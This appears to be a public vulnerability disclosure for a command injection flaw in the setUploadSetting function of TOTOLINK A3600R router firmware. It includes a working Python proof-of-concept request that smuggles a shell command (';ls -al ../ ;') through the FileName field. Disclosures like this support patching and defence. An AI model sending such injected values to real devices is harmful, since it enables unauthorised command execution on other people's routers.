## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=63&ids=36

## Affected version

A3600R V4.1.2cu.5182_B20201102

## Vulnerability details

In the A3600R V4.1.2cu.5182_B20201102 firmware has a command injection vulnerability in the `setUploadSetting` function. The `v6` variable receives the `FileName` parameter from a POST request. However, since the user can control the input of `FileName`, the `sprintf` can cause a command injection vulnerability.

![image-20240721013957073](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721013957073.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"FileName":";ls -al ../ ;","topicurl":"setUploadSetting"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721213628055](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721213628055.png)
